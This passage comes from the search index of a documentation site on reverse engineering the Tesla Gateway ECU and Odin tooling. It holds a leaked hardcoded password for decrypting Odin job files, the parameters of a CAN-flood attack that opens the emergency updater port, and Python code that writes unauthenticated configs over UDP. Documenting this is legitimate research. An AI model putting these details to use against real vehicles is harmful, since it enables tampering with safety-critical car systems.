dm-verity format \u2705 VERIFIED Table extracted Signature bypass \u274c NOT FOUND No method exists"},{"location":"1-overview/evidence-quality/#can-flood","title":"CAN Flood","text":"Topic Status Evidence Quality Port 25956 opening \u26a0\ufe0f INFERRED Single vehicle test Message IDs required \u26a0\ufe0f INFERRED Script works sometimes Reliability rate \u274c UNTESTED Single data point Firmware mitigations \u26a0\ufe0f INFERRED Behavior changes observed"},{"location":"1-overview/evidence-quality/#documentation-standards","title":"Documentation Standards","text":""},{"location":"1-overview/evidence-quality/#required-for-all-claims","title":"Required for All Claims","text":"<ol> <li>Source citation - File path, binary offset, or code reference</li> <li>Verification status - One of: VERIFIED, INFERRED, UNTESTED</li> <li>Evidence type - What proves this claim</li> <li>Date - When verified (findings may become outdated)</li> </ol>"},{"location":"1-overview/evidence-quality/#example-citation","title":"Example Citation","text":"<pre><code>### Finding: VIN stored at config ID 0x0000\n\n**Status:** \u2705 VERIFIED  \n**Evidence:** \n- Flash dump extraction at offset 0x19004\n- CRC-8 validation passed\n- Confirmed by Odin database (accessId mapping)\n**Source:** [gateway/80-ryzen-gateway-flash-COMPLETE.md]\n**Date:** 2026-02-03\n</code></pre>"},{"location":"1-overview/evidence-quality/#contradictions-resolved","title":"Contradictions Resolved","text":"Topic Old Claim New Claim Resolution Config count \"~90 configs\" \"662 configs\" Ryzen has more than Intel MCU Config hashing \"Unknown\" \"SHA256 complete\" Algorithm decompiled Service PIN \"May be local hash\" \"Backend only\" Binary analysis Cert validity \"10 years\" \"~2 years\" Certificate analysis <p>All contradictions were resolved by preferring: 1. More recent analysis 2. Multiple sources over single 3. Binary evidence over speculation</p>"},{"location":"1-overview/evidence-quality/#updating-documentation","title":"Updating Documentation","text":""},{"location":"1-overview/evidence-quality/#when-to-update","title":"When to Update","text":"<ul> <li>New firmware analysis</li> <li>Hardware validation</li> <li>Contradiction found</li> <li>Tool created/tested</li> </ul>"},{"location":"1-overview/evidence-quality/#update-process","title":"Update Process","text":"<ol> <li>Verify new finding against existing</li> <li>Update status marker if improved</li> <li>Add new evidence citation</li> <li>Note date of update</li> <li>Resolve any contradictions</li> </ol>"},{"location":"1-overview/evidence-quality/#quality-metrics","title":"Quality Metrics","text":""},{"location":"1-overview/evidence-quality/#current-repository-status","title":"Current Repository Status","text":"Category Count Percentage VERIFIED ~25 documents 40% INFERRED ~20 documents 35% UNTESTED ~15 documents 25%"},{"location":"1-overview/evidence-quality/#target","title":"Target","text":"Category Target VERIFIED &gt;50% INFERRED &lt;35% UNTESTED &lt;15% <p>Last Updated: 2026-02-07</p>"},{"location":"1-overview/key-findings/","title":"Key Findings","text":"<p>Major discoveries from Tesla Gateway and Odin research.</p>"},{"location":"1-overview/key-findings/#1-gateway-configuration-system-complete","title":"1. Gateway Configuration System \u2705 COMPLETE","text":""},{"location":"1-overview/key-findings/#summary","title":"Summary","text":"<p>The Gateway ECU stores 662 configuration entries in flash, validated with CRC-8.</p>"},{"location":"1-overview/key-findings/#details","title":"Details","text":"Finding Evidence 662 configs extracted Flash dump analysis CRC-8 polynomial 0x2F 100% validation rate Two-tier security model Odin database + testing Entry format: <code>[CRC][Len][ID][Data]</code> Binary parsing"},{"location":"1-overview/key-findings/#security-implication","title":"Security Implication","text":"<p>Insecure configs (map region, units) can be modified via UDP:3500 without authentication.</p> <p>Secure configs (VIN, country, supercharger) require Hermes authentication.</p> <p>Source: Gateway Config System</p>"},{"location":"1-overview/key-findings/#2-odin-config-hashing-complete","title":"2. Odin Config Hashing \u2705 COMPLETE","text":""},{"location":"1-overview/key-findings/#summary_1","title":"Summary","text":"<p>Tesla obfuscates Odin config names using SHA256 hashing with a per-firmware salt.</p>"},{"location":"1-overview/key-findings/#algorithm","title":"Algorithm","text":"<pre><code># Key hash\nkey_hash = SHA256(key + salt)\n\n# Value hash (value comes FIRST)\nvalue_hash = SHA256(value + key + salt)\n</code></pre>"},{"location":"1-overview/key-findings/#impact","title":"Impact","text":"<ul> <li>All 62-64 public configs decoded</li> <li>94-96 hashes remain unknown (no enum definitions)</li> <li>Algorithm decompiled from Python bytecode</li> </ul> <p>Source: Odin Config Decoder</p>"},{"location":"1-overview/key-findings/#3-odj-file-encryption-cracked","title":"3. ODJ File Encryption \u2705 CRACKED","text":""},{"location":"1-overview/key-findings/#summary_2","title":"Summary","text":"<p>Odin job files (.odj) use Fernet encryption with a hardcoded password.</p>"},{"location":"1-overview/key-findings/#credentials","title":"Credentials","text":"Parameter Value Password <code>cmftubxi7wlvmh1wmbzz00vf1ziqezf6</code> KDF PBKDF2-HMAC-SHA256 Iterations 123456 Salt First 16 bytes of file"},{"location":"1-overview/key-findings/#impact_1","title":"Impact","text":"<p>All ODJ files can be decrypted without Tesla access.</p> <p>Source: ODJ Encryption</p>"},{"location":"1-overview/key-findings/#4-service-mode-authentication-verified","title":"4. Service Mode Authentication \u2705 VERIFIED","text":""},{"location":"1-overview/key-findings/#summary_3","title":"Summary","text":"<p>Service mode does NOT use a simple PIN comparison. Authentication requires Tesla backend validation.</p>"},{"location":"1-overview/key-findings/#key-findings_1","title":"Key Findings","text":"Finding Evidence No hardcoded PIN Binary string search No CRC32 hash validation Binary search Backend validation via Hermes D-Bus + symbol analysis Geofence restrictions exist Function references"},{"location":"1-overview/key-findings/#impact_2","title":"Impact","text":"<p>No bypass found for production vehicles. Requires Tesla Toolbox with valid subscription.</p> <p>Source: Service Mode Analysis</p>"},{"location":"1-overview/key-findings/#5-usb-update-package-format-complete","title":"5. USB Update Package Format \u2705 COMPLETE","text":""},{"location":"1-overview/key-findings/#summary_4","title":"Summary","text":"<p>USB offline updates use SquashFS with Ed25519 signatures and dm-verity verification.</p>"},{"location":"1-overview/key-findings/#package-structure","title":"Package Structure","text":"<pre><code>[SquashFS (LZ4)] + [Padding] + [0xba01ba01 + Ed25519 sig] + [dm-verity hash table]\n</code></pre>"},{"location":"1-overview/key-findings/#key-details","title":"Key Details","text":"Component Format Filesystem SquashFS, LZ4 compression Signature NaCl/Ed25519 (64 bytes) Magic 0xba01ba01 Integrity dm-verity SHA-256"},{"location":"1-overview/key-findings/#impact_3","title":"Impact","text":"<p>Cannot forge signatures without Tesla's private key. Pre-signed packages can be replayed.</p> <p>Source: USB Updates</p>"},{"location":"1-overview/key-findings/#6-can-flood-exploit-partial","title":"6. CAN Flood Exploit \u26a0\ufe0f PARTIAL","text":""},{"location":"1-overview/key-findings/#summary_5","title":"Summary","text":"<p>Flooding specific CAN message IDs can open Gateway port 25956, enabling firmware access.</p>"},{"location":"1-overview/key-findings/#attack-parameters","title":"Attack Parameters","text":"CAN ID Rate Purpose 0x3C2 10,000/sec Diagnostic trigger 0x622 33/sec UDS tester-present"},{"location":"1-overview/key-findings/#impact_4","title":"Impact","text":"<ul> <li>Opens emergency updater port</li> <li>Allows firmware handshake redirection</li> <li>Reliability varies by firmware version</li> </ul> <p>Source: CAN Flood Attack</p>"},{"location":"1-overview/key-findings/#7-odin-access-levels-documented","title":"7. Odin Access Levels \u2705 DOCUMENTED","text":""},{"location":"1-overview/key-findings/#summary_6","title":"Summary","text":"<p>The Odin routines database reveals which configs are protected.</p>"},{"location":"1-overview/key-findings/#access-level-flags","title":"Access Level Flags","text":"Flag Meaning Example <code>accessLevel: \"UDP\"</code> No authentication ecuMapVersion <code>accessLevel: \"GTW\"</code> Hardware locked devSecurityLevel No special flag May require auth superchargingAccess"},{"location":"1-overview/key-findings/#impact_5","title":"Impact","text":"<p>Identifies exactly which configs can be modified remotely vs require Tesla authentication.</p> <p>Source: Odin Routines Database</p>"},{"location":"1-overview/key-findings/#8-network-topology-mapped","title":"8. Network Topology \u2705 MAPPED","text":""},{"location":"1-overview/key-findings/#summary_7","title":"Summary","text":"<p>Tesla vehicles use internal network 192.168.90.0/24 with identified components.</p>"},{"location":"1-overview/key-findings/#key-components","title":"Key Components","text":"IP Component Ports .100 MCU (ICE/MCU2) Various .102 Gateway 3500, 69, 25956 .103 APE 8901 .60 Modem 49503"},{"location":"1-overview/key-findings/#impact_6","title":"Impact","text":"<p>Any device on internal network can access Gateway UDP API.</p>"},{"location":"1-overview/key-findings/#9-can-message-database-extracted","title":"9. CAN Message Database \u2705 EXTRACTED","text":""},{"location":"1-overview/key-findings/#summary_8","title":"Summary","text":"<p>6,647 CAN message entries extracted from Gateway firmware.</p>"},{"location":"1-overview/key-findings/#details_1","title":"Details","text":"Metric Value Total entries 6,647 ID range 0x000 - 0x7FF Format CSV with handlers <p>Source: data/gateway/can-message-database-VERIFIED.csv</p>"},{"location":"1-overview/key-findings/#10-firmware-string-database-extracted","title":"10. Firmware String Database \u2705 EXTRACTED","text":""},{"location":"1-overview/key-findings/#summary_9","title":"Summary","text":"<p>37,702 strings extracted from 6MB Gateway firmware binary.</p>"},{"location":"1-overview/key-findings/#contents","title":"Contents","text":"<ul> <li>Config function names</li> <li>Error messages</li> <li>Debug strings</li> <li>CAN message identifiers</li> </ul> <p>Source: data/gateway/strings.csv</p>"},{"location":"1-overview/key-findings/#summary-table","title":"Summary Table","text":"Finding Status Impact Gateway 662 configs \u2705 Complete Full config access CRC-8 algorithm \u2705 Verified Config validation Two-tier security \u2705 Verified Attack surface mapping SHA256 config hashing \u2705 Complete Odin decoding ODJ encryption \u2705 Cracked Job file access Service mode auth \u2705 Analyzed No bypass found USB update format \u2705 Complete Package structure CAN flood exploit \u26a0\ufe0f Partial Port 25956 access <p>Last Updated: 2026-02-07</p>"},{"location":"2-gateway/","title":"Gateway ECU Research","text":"<p>Complete reverse engineering of Tesla's Gateway Electronic Control Unit.</p>"},{"location":"2-gateway/#overview","title":"Overview","text":"<p>The Gateway ECU is Tesla's central CAN bus aggregator, bridging all vehicle networks and storing critical configuration data. This research documents:</p> <ul> <li>Hardware: NXP MPC5748G (PowerPC e200z7 VLE core)</li> <li>Firmware: 6 MB binary, fully extracted</li> <li>Configs: 662 entries with CRC-8 validation</li> <li>Security: Two-tier model (UDP insecure, Hermes secure)</li> </ul>"},{"location":"2-gateway/#documentation","title":"Documentation","text":"Document Description architecture.md Hardware, memory map, firmware structure config-system.md 662 configs, CRC algorithm, storage format security-model.md Two-tier security, secure vs insecure configs udp-protocol.md Port 3500 API format and commands firmware-analysis.md Disassembly findings, function table"},{"location":"2-gateway/#quick-facts","title":"Quick Facts","text":"Metric Value Processor NXP MPC5748G Architecture PowerPC e200z7 VLE Firmware Size 6,225,920 bytes (6 MB) Config Count 662 entries CRC Polynomial 0x2F (CRC-8) UDP Port 3500 Emergency Port 25956 (CAN flood)"},{"location":"2-gateway/#key-findings","title":"Key Findings","text":""},{"location":"2-gateway/#1-configuration-system-complete","title":"1. Configuration System \u2705 COMPLETE","text":"<ul> <li>662 configuration entries extracted from Ryzen Gateway flash dump</li> <li>CRC-8 validation with polynomial 0x2F (100% verification rate)</li> <li>Two-tier security: UDP-accessible vs Hermes-authenticated</li> <li>Entry format: <code>[CRC:1][Len:1][ID:2 BE][Data:variable]</code></li> </ul>"},{"location":"2-gateway/#2-security-model-verified","title":"2. Security Model \u2705 VERIFIED","text":"<p>Insecure (UDP port 3500): - Map region, display units, preferences - No authentication required - Any device on 192.168.90.0/24 can modify</p> <p>Secure (Hermes + gw-diag): - VIN, country, supercharger access - Requires authenticated Tesla session - Cryptographic signature validation</p>"},{"location":"2-gateway/#3-can-message-database-complete","title":"3. CAN Message Database \u2705 COMPLETE","text":"<ul> <li>6,647 CAN message entries extracted from firmware</li> <li>Message IDs, data lengths, and handlers documented</li> <li>See data/gateway/can-message-database-VERIFIED.csv</li> </ul>"},{"location":"2-gateway/#4-firmware-strings-extracted","title":"4. Firmware Strings \u2705 EXTRACTED","text":"<ul> <li>37,702 strings extracted from 6MB binary</li> <li>Config names, function references, error messages</li> <li>See data/gateway/strings.csv</li> </ul>"},{"location":"2-gateway/#tools","title":"Tools","text":"Tool Purpose gateway_database_query.py UDP config read/write gateway_crc_validator.py CRC-8 calculation gw-diag (Tesla) Authenticated config access"},{"location":"2-gateway/#network-access","title":"Network Access","text":"<pre><code>Gateway IP: 192.168.90.102\nUDP Port:   3500 (config API)\nTFTP Port:  69 (firmware updates)\nEmergency:  25956 (CAN flood trigger)\n</code></pre>"},{"location":"2-gateway/#related-research","title":"Related Research","text":"<ul> <li>Odin Routines Database - Access levels from Odin</li> <li>CAN Flood Attack - Opening port 25956</li> <li>VIN Write Attack - JTAG flash modification</li> </ul> <p>Status: COMPLETE Last Updated: 2026-02-07</p>"},{"location":"2-gateway/architecture/","title":"Gateway Architecture","text":"<p>Hardware and firmware architecture of Tesla's Gateway ECU.</p>"},{"location":"2-gateway/architecture/#hardware-specifications","title":"Hardware Specifications","text":""},{"location":"2-gateway/architecture/#processor","title":"Processor","text":"Specification Value Chip NXP MPC5748G Core PowerPC e200z7 Instruction Set VLE (Variable Length Encoding) Flash Size 6 MB RAM ~384 KB SRAM <p>Evidence: JTAG ID pattern analysis, Ghidra disassembly confirms VLE encoding.</p>"},{"location":"2-gateway/architecture/#debug-interface","title":"Debug Interface","text":"Pin Function Mini-HDMI connector Debug/JTAG interface Pins 4+6 short Recovery mode trigger <p>Evidence: Hardware pinout analysis</p>"},{"location":"2-gateway/architecture/#memory-map","title":"Memory Map","text":""},{"location":"2-gateway/architecture/#flash-layout","title":"Flash Layout","text":"Address Range Size Description 0x00000000 - 0x00018FFF ~100 KB Bootloader region 0x00019000 - 0x00030000 ~100 KB Configuration database 0x00030000 - 0x00403000 ~4 MB Main firmware code 0x00403000 - 0x00500000 ~1 MB Data tables (CAN messages, metadata) 0x00500000 - 0x005F0000 ~1 MB Additional firmware/data <p>Evidence: Flash dump analysis from 80-ryzen-gateway-flash-COMPLETE.md</p>"},{"location":"2-gateway/architecture/#configuration-storage","title":"Configuration Storage","text":"<pre><code>Base Address: 0x19000\nEnd Address:  0x30000 (approximate)\nEntry Count:  662 configs\nFormat:       [CRC:1][Len:1][ID:2 BE][Data:variable]\n</code></pre> <p>Entry Format Example: <pre><code>Offset   Data              Meaning\n+0x00    A5                CRC-8 checksum\n+0x01    11                Length (17 bytes)\n+0x02    00 00             Config ID (0x0000 = VIN)\n+0x04    37 53 41 59...    ASCII VIN \"7SAY...\"\n</code></pre></p>"},{"location":"2-gateway/architecture/#firmware-structure","title":"Firmware Structure","text":""},{"location":"2-gateway/architecture/#binary-analysis","title":"Binary Analysis","text":"Metric Value Total Size 6,225,920 bytes String Count 37,702 Function Count ~8,000 (estimated) CAN Message Handlers 6,647 entries"},{"location":"2-gateway/architecture/#key-regions","title":"Key Regions","text":"Offset Content Evidence 0x00950 Jump table start Disassembly pattern 0x00CAC Jump table end Disassembly pattern 0x01044 Factory gate check Symbol pattern 0x36730 SHA-256 hash 32-byte hash value 0x403000 CAN metadata table 21,000+ entries"},{"location":"2-gateway/architecture/#can-bus-architecture","title":"CAN Bus Architecture","text":""},{"location":"2-gateway/architecture/#bus-bridging","title":"Bus Bridging","text":"<p>The Gateway bridges multiple CAN networks:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   CHASSIS   \u2502\u25c4\u2500\u2500\u2510\n\u2502    CAN      \u2502   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2502\n                  \u2502     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u251c\u2500\u2500\u2500\u2500\u25b6\u2502   GATEWAY   \u2502\n\u2502  POWERTRAIN \u2502\u25c4\u2500\u2500\u2524     \u2502     ECU     \u2502\n\u2502    CAN      \u2502   \u2502     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2502            \u25b2\n                  \u2502            \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u2502     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   BODY      \u2502\u25c4\u2500\u2500\u2524     \u2502  Ethernet   \u2502\n\u2502    CAN      \u2502   \u2502     \u2502 192.168.90.x\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2502     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510   \u2502\n\u2502  INFOTAIN   \u2502\u25c4\u2500\u2500\u2518\n\u2502    CAN      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"2-gateway/architecture/#can-message-database","title":"CAN Message Database","text":"Metric Value Total Entries 6,647 ID Range 0x000 - 0x7FF (standard) Data Format CSV with ID, length, handler <p>Location: data/gateway/can-message-database-VERIFIED.csv</p>"},{"location":"2-gateway/architecture/#network-interface","title":"Network Interface","text":""},{"location":"2-gateway/architecture/#ethernet","title":"Ethernet","text":"Parameter Value IP Address 192.168.90.102 Subnet 192.168.90.0/24 Gateway 192.168.90.1"},{"location":"2-gateway/architecture/#ports","title":"Ports","text":"Port Protocol Service 3500 UDP Configuration API 69 TFTP Firmware transfer 25956 TCP Emergency updater (CAN flood)"},{"location":"2-gateway/architecture/#bootloader","title":"Bootloader","text":""},{"location":"2-gateway/architecture/#factory-gate","title":"Factory Gate","text":"<p>The bootloader contains a \"factory gate\" check:</p> Offset Function 0x01044 Factory mode check Result Determines fuse state (dev vs prod) <p>Fused (Production): - JTAG readout protection active - Signature verification enforced - Factory mode blocked</p> <p>Unfused (Development): - JTAG access allowed - Dev keys accepted - Factory mode available</p>"},{"location":"2-gateway/architecture/#security-features","title":"Security Features","text":""},{"location":"2-gateway/architecture/#hardware-security","title":"Hardware Security","text":"Feature Status JTAG Fuse Blown on production Signature Keys Ed25519 (hardware locked) Flash Protection Write-protected regions"},{"location":"2-gateway/architecture/#firmware-verification","title":"Firmware Verification","text":"<pre><code>Hash 1 (0x0025): cbba81fb37a95522177d7bd571e60bef515ecede556410cd6733935da456afc6\nHash 2 (0x0026): 5f8cf2c792acce3f821c87ec9d303c18f7bcdcc920e4085ea2c84bc1d7286e99\n</code></pre> <p>These SHA-256 hashes verify firmware integrity and are checked at boot.</p>"},{"location":"2-gateway/architecture/#comparison-intel-mcu-vs-ryzen-mcu","title":"Comparison: Intel MCU vs Ryzen MCU","text":"Feature Intel MCU Gateway Ryzen MCU Gateway Config Count ~90 662 Flash Layout Smaller Expanded regions CAN Mailbox Configs ~50 384 (0x1400-0x147C) <p>Note: Ryzen-based vehicles have significantly larger configuration databases.</p>"},{"location":"2-gateway/architecture/#research-artifacts","title":"Research Artifacts","text":"File Description <code>data/gateway/gateway_configs_parsed.txt</code> All 662 parsed configs <code>data/gateway/strings.csv</code> 37,702 extracted strings <code>data/gateway/can-message-database-VERIFIED.csv</code> CAN message entries"},{"location":"2-gateway/architecture/#tools-for-analysis","title":"Tools for Analysis","text":""},{"location":"2-gateway/architecture/#ghidra","title":"Ghidra","text":"<pre><code># Load with PowerPC VLE processor\n# Base address: 0x00000000\n# Entry point: 0x00000000 or 0x00001000\n</code></pre>"},{"location":"2-gateway/architecture/#binary-ninja","title":"Binary Ninja","text":"<pre><code># Requires VLE plugin for proper disassembly\n# See scripts/ghidra-vle-analysis.py\n</code></pre> <p>Status: VERIFIED Evidence: JTAG flash dump, Ghidra disassembly, CRC validation Last Updated: 2026-02-07</p>"},{"location":"2-gateway/config-system/","title":"Gateway Configuration System","text":"<p>Complete documentation of the 662 Gateway configuration entries, CRC validation, and storage format.</p>"},{"location":"2-gateway/config-system/#overview","title":"Overview","text":"<p>The Gateway ECU stores 662 configuration entries in flash memory. Each entry contains vehicle identity, feature flags, and hardware settings.</p> Metric Value Total Configs 662 entries CRC Algorithm CRC-8, polynomial 0x2F Validation Rate 100% verified Source Ryzen Gateway flash dump"},{"location":"2-gateway/config-system/#entry-format","title":"Entry Format","text":""},{"location":"2-gateway/config-system/#structure","title":"Structure","text":"<pre><code>Offset  Size    Field           Description\n+0x00   1       CRC             CRC-8 checksum (polynomial 0x2F)\n+0x01   1       Length          Data length (including ID)\n+0x02   2       Config ID       Big-endian config identifier\n+0x04   N       Data            Variable-length data (up to 253 bytes)\n</code></pre>"},{"location":"2-gateway/config-system/#example-vin-config-id-0x0000","title":"Example: VIN (Config ID 0x0000)","text":"<pre><code>Hex:    A5 11 00 00 37 53 41 59 47 44 45 45 58 50 41 30 35 32 34 36 36\n        \u2502  \u2502  \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n        \u2502  \u2502   ID   ASCII: \"7SAYGDEEXPA052466\" (VIN)\n        \u2502  Length: 17 bytes + 2 (ID) = 0x11\n        CRC-8 checksum\n</code></pre>"},{"location":"2-gateway/config-system/#crc-8-algorithm","title":"CRC-8 Algorithm","text":""},{"location":"2-gateway/config-system/#specification","title":"Specification","text":"Parameter Value Polynomial 0x2F (47 decimal) Initial Value 0x00 Input [Config ID (2 bytes BE)] + [Data] Output 1 byte CRC"},{"location":"2-gateway/config-system/#python-implementation","title":"Python Implementation","text":"<pre><code>def calculate_crc8(config_id: int, data: bytes) -&gt; int:\n    \"\"\"Calculate CRC-8 with polynomial 0x2F.\"\"\"\n    POLY = 0x2F\n    crc = 0x00\n\n    # Process config ID (big-endian)\n    for byte in config_id.to_bytes(2, 'big'):\n        crc ^= byte\n        for _ in range(8):\n            if crc &amp; 0x80:\n                crc = ((crc &lt;&lt; 1) ^ POLY) &amp; 0xFF\n            else:\n                crc = (crc &lt;&lt; 1) &amp; 0xFF\n\n    # Process data\n    for byte in data:\n        crc ^= byte\n        for _ in range(8):\n            if crc &amp; 0x80:\n                crc = ((crc &lt;&lt; 1) ^ POLY) &amp; 0xFF\n            else:\n                crc = (crc &lt;&lt; 1) &amp; 0xFF\n\n    return crc\n</code></pre>"},{"location":"2-gateway/config-system/#validation-results","title":"Validation Results","text":"<pre><code>Tested:    662 configs\nPassed:    662 (100%)\nFailed:    0\nAlgorithm: VERIFIED \u2705\n</code></pre>"},{"location":"2-gateway/config-system/#config-id-ranges","title":"Config ID Ranges","text":""},{"location":"2-gateway/config-system/#distribution","title":"Distribution","text":"Range Count Description 0x0000 - 0x00A1 88 Core vehicle configs (VIN, features) 0x1400 - 0x147C 384 CAN mailbox configurations 0x15xx 9 System configs 0x4000+ 2 Large tables (routing) 0xC000+ 179 Unknown (possibly code addresses)"},{"location":"2-gateway/config-system/#critical-config-ids","title":"Critical Config IDs","text":"ID Name Size Access Description 0x0000 VIN 17 Secure Vehicle Identification Number 0x0001 partNumber ~12 Secure Gateway part number 0x0003 firmwareVersion ~12 Read-only Firmware version string 0x0006 country 2 Secure Country code (US, DE, CN) 0x0010 factoryMode 1 Secure Factory mode status (bit 7) 0x0011 debugUart 1 UDP Debug UART enable 0x0014 mapRegion 1 UDP Navigation map region 0x0020 ecuMapVersion 1 UDP ECU configuration version 0x0025 hash1 32 Secure Firmware hash 1 0x0026 hash2 32 Secure Firmware hash 2 0x0029 featureFlags 1 Mixed Feature bitmap"},{"location":"2-gateway/config-system/#config-values-extracted","title":"Config Values Extracted","text":""},{"location":"2-gateway/config-system/#vehicle-identity","title":"Vehicle Identity","text":"<pre><code>ID=0x0000: VIN = \"7SAYGDEEXPA052466\"\nID=0x0001: Part Number = \"1684435-00-E\"\nID=0x0003: Firmware P/N = \"1960101-12-D\"\nID=0x0006: Country = \"US\"\n</code></pre>"},{"location":"2-gateway/config-system/#feature-flags","title":"Feature Flags","text":"ID Value Interpretation 0x0007 0x01 Feature enabled 0x0008 0x01 Feature enabled 0x0010 0x83 Factory mode enabled (bit 7 set) 0x0011 0x08 Debug UART enabled 0x0020 0x02 Region: North America 0x0023 0x03 Hardware revision 3 0x0029 0x0F All features enabled"},{"location":"2-gateway/config-system/#security-hashes","title":"Security Hashes","text":"<pre><code>Hash 1 (0x0025): cbba81fb37a95522177d7bd571e60bef515ecede556410cd6733935da456afc6\nHash 2 (0x0026): 5f8cf2c792acce3f821c87ec9d303c18f7bcdcc920e4085ea2c84bc1d7286e99\n</code></pre>"},{"location":"2-gateway/config-system/#can-mailbox-configs-0x1400-0x147c","title":"CAN Mailbox Configs (0x1400-0x147C)","text":""},{"location":"2-gateway/config-system/#format","title":"Format","text":"<pre><code>Size: 13 bytes typically\nStructure:\n[CRC:1][0x0D][ID:2 BE][CAN_ID:2][Reserved:4][Filter_Mask:4][Status:1]\n</code></pre>"},{"location":"2-gateway/config-system/#example-entry","title":"Example Entry","text":"<pre><code>0x1400: 00 00 00 00 FF FF FF FF 00 00 00 00 01\n        \u2502  \u2502  \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n        \u2502  \u2502   ID   CAN ID     Mask         Status (enabled)\n        \u2502  Length\n        CRC\n</code></pre>"},{"location":"2-gateway/config-system/#status-values","title":"Status Values","text":"Value Meaning 0x00 Disabled 0x01 Enabled 0x02 Unknown <p>Purpose: Define which CAN message IDs are accepted/filtered by the Gateway.</p>"},{"location":"2-gateway/config-system/#large-configs-0x4000","title":"Large Configs (0x4000+)","text":"ID Size Description 0x4000 192 bytes Routing table or filter bank 0x0415 57 bytes System configuration 0x15FE 148 bytes Array of IDs 0x15FB 41 bytes Hex ASCII hash"},{"location":"2-gateway/config-system/#practical-usage","title":"Practical Usage","text":""},{"location":"2-gateway/config-system/#read-config-via-udp","title":"Read Config via UDP","text":"<pre><code>import socket\nimport struct\n\nGATEWAY_IP = \"192.168.90.102\"\nGATEWAY_PORT = 3500\nCMD_READ = 0x01\n\ndef read_config(config_id: int) -&gt; bytes:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    packet = struct.pack('&lt;HBH', 3, CMD_READ, config_id)\n    sock.sendto(packet, (GATEWAY_IP, GATEWAY_PORT))\n    response, _ = sock.recvfrom(1024)\n    return response\n</code></pre>"},{"location":"2-gateway/config-system/#write-config-via-udp","title":"Write Config via UDP","text":"<pre><code>CMD_WRITE = 0x02\n\ndef write_config(config_id: int, data: bytes) -&gt; bool:\n    # Only works for INSECURE configs!\n    crc = calculate_crc8(config_id, data)\n    length = len(data) + 2  # ID + data\n\n    packet = struct.pack('&lt;HBBH', length + 3, CMD_WRITE, length, config_id)\n    packet += bytes([crc]) + data\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.sendto(packet, (GATEWAY_IP, GATEWAY_PORT))\n    # Check response for success/failure\n</code></pre>"},{"location":"2-gateway/config-system/#validate-config-crc","title":"Validate Config CRC","text":"<pre><code>python3 scripts/gateway_crc_validator.py parse gateway_flash.bin\n</code></pre>"},{"location":"2-gateway/config-system/#security-classification","title":"Security Classification","text":"<p>See security-model.md for full details on which configs are secure vs insecure.</p>"},{"location":"2-gateway/config-system/#quick-reference","title":"Quick Reference","text":"Type Access Examples Insecure UDP:3500 mapRegion, units, debugUart Secure Hermes auth VIN, country, supercharger Read-only N/A firmwareVersion, hardware IDs Hardware Fuses devSecurityLevel"},{"location":"2-gateway/config-system/#cross-references","title":"Cross-References","text":"<ul> <li>UDP Protocol - Packet format for reading/writing</li> <li>Security Model - Secure vs insecure configs</li> <li>Odin Routines Database - Config access levels</li> <li>data/gateway/gateway_configs_parsed.txt - All 662 configs</li> </ul> <p>Status: COMPLETE \u2705 Evidence: Flash dump analysis, 100% CRC validation Last Updated: 2026-02-07</p>"},{"location":"2-gateway/firmware-analysis/","title":"Gateway Firmware Analysis","text":"<p>Disassembly findings from the 6MB Gateway firmware binary.</p>"},{"location":"2-gateway/firmware-analysis/#overview","title":"Overview","text":"<p>The Gateway firmware was extracted via JTAG and analyzed using Ghidra with PowerPC VLE support.</p> Metric Value Binary Size 6,225,920 bytes (6 MB) Architecture PowerPC e200z7 VLE Strings Extracted 37,702 Functions (estimated) ~8,000"},{"location":"2-gateway/firmware-analysis/#key-regions","title":"Key Regions","text":""},{"location":"2-gateway/firmware-analysis/#jump-table","title":"Jump Table","text":"Offset Description 0x00950 Jump table start 0x00CAC Jump table end Purpose Function dispatch table"},{"location":"2-gateway/firmware-analysis/#factory-gate","title":"Factory Gate","text":"Offset Description 0x01044 Factory gate check Purpose Determines fuse state (dev/prod)"},{"location":"2-gateway/firmware-analysis/#firmware-hashes","title":"Firmware Hashes","text":"Offset Size Description 0x36730 32 bytes SHA-256 firmware hash"},{"location":"2-gateway/firmware-analysis/#config-metadata","title":"Config Metadata","text":"Offset Size Description 0x403000 ~100 KB CAN message metadata table 0x019000 ~100 KB Configuration database"},{"location":"2-gateway/firmware-analysis/#string-analysis","title":"String 